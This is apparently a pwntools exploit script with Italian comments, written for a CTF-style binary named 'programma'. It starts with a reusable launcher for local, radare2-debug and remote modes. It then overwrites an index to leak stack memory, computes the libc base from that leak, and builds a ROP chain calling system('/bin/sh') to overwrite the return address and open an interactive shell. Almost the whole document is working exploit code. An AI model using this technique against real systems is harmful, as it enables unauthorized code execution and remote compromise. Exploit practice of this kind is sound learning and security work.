#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./programma", checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main+512; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)



io = start()
fake_size = 120

# preparo un pacchetto di lunghezza 60.
# il 61esimo byte sovrascrive l'indice i.
# Questo pacchetto consente di inserire 61 caratteri ma far credere
# al programma di averne letti 120.
test = flat({60:[
    chr(fake_size).encode(),
    ]})

warning("Sovrascrittura dell'indice per ottenere una lettura dello stack.")
io.sendline(f"{fake_size}".encode())
io.sendline(test)

# ricevo adesso il dump della memoria di 61 caratteri inseriti 
# + 59 byte dello stack gettati fuori per la desincronizzazione
io.recvuntil(b'Nome inserito: ')
raw = io.recvline()[64:]
raw = [raw[i:i+8] for i in range(0, len(raw), 8)]
warning(f"Dump grezzo della memoria dello stack acquisito.")

# allineamento tramite debugger
libc_leak = u64(raw[1])
main_leak = u64(raw[3])
libc_puts = libc_leak + 354552
libc.address = libc_puts - libc.sym['puts']
binsh = next(libc.search(b'/bin/sh\x00'))
rop = ROP(libc)

info("-----------------------------------")
success("Risoluzione degli offset critici e ricostruzione dello spazio di indirizzamento completata:")
success(f"leak libc        : {hex(libc_leak)}")
success(f"indirizzo main   : {hex(main_leak)}")
success(f"base libc        : {hex(libc.address)}")
success(f"puts@libc        : {hex(libc_puts)}")
info("-----------------------------------")
warning(f"Indirizzo di system() risolto        : {hex(libc.sym['system'])}")
warning(f"Stringa \"/bin/sh\" individuata        : {hex(binsh)}")
warning(f"Attivatore pop rdi; ret individuato  : {hex(rop.rdi[0])}")

# preparo il pacchetto per sovrascrivere nuovamente l'indice i
# ed il return address
test = flat({108:[
    108,
    b'\x00\x00\x00\x00',
    rop.rdi[0], binsh,
    rop.ret[0],
    libc.sym['system']
    ]})

warning("Deviazione del flusso di controllo verso system().")
success(f"Shell attivata.")
io.sendline(f"{len(test)}".encode())
io.sendline(test)
io.recvuntil(b"Cognome inserito: ")
io.recv(160)
io.interactive()
